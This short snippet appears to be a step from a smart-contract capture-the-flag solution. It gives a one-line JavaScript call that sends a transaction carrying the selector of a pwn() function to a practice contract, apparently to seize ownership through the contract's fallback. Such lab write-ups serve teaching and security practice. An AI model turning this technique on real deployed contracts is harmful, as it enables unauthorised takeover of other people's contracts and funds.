send a transaction to the contract, passing as data the function selector for pwn()
```javascript
await sendTransaction({from:player, to:contract.address, data:"0xdd365b8b"})
```
